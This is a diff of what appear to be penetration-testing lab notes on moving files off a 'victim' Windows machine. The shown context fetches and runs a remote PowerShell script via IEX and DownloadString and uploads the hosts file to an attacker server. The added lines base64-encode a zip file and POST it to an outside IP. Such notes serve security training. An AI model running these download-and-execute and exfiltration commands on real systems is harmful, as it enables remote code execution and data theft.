@@ -294,6 +294,7 @@ From the victim's machine (windows), we will upload the file with Invoke-WebRequ
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 
 Invoke-FileUpload -Uri http://$ipServer:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
 ```
 
 
@@ -305,6 +306,10 @@ Another way to use PowerShell and base64 encoded files for upload operations is 
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 
 Invoke-WebRequest -Uri http://$ipServer:8000/ -Method POST -Body $b64
+
+
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Tools\pingcastle.zip' -Encoding Byte))
+Invoke-WebRequest -Uri http://10.10.14.21:8000/ -Method POST -Body $b64
 ```
 
 From the attacker machine:
